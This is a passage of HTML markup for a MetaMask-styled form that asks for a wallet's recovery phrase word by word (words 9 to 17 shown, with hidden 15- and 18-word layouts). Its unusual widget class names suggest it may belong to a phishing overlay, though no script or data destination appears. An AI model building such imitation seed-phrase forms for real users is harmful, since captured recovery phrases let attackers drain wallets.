                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        9.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #9"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="9"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        10.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #10"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="10"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        11.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #11"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="11"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        12.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #12"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="12"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <div
                    id="metamask-container-15-words"
                    class="metamask-container-15-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        13.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #13"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="13"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        14.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #14"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="14"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        15.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #15"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="15"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <div
                    id="metamask-container-18-words"
                    class="metamask-container-18-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        16.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-normal font-euclid scwtw-text-[14px] scwtw-text-[#141618] dark:scwtw-text-[#ffffff] scwtw-p-3 md:scwtw-h-[48px] scwtw-h-[40px] scwtw-rounded-[8px] scwtw-flex scwtw-items-center scwtw-bg-[#ffffff] dark:scwtw-bg-[#141618] scwtw-border scwtw-border-[#848c96] dark:scwtw-border-[#6a737d]scwtw-outline-none hover:scwtw-border-[#0376c9] dark:hover:scwtw-border-[#43aefc] scwtw-outline-none placeholder:scwtw-text-transparent metamask-seed-input"
                        type="password"
                        placeholder="Word #16"
                      />
                      <button
                        class="scwtw-group hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 metamask-toggle-seed-input"
                        id="metamask-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="16"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 640 512"
                        >
                          <path
                            d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#141618] dark:scwtw-text-[#ffffff]"
                          width="24"
                          height="24"
                          fill="currentColor"
                          xmlns="http://www.w3.org/2000/svg"
                          viewBox="0 0 576 512"
                        >
                          <path
                            d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div
                      class="scwtw-relative scwtw-flex scwtw-items-center scwtw-gap-x-2"
                    >
                      <p
                        class="font-euclid scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal scwtw-w-10"
                      >
                        17.
                      </p>
                      <input
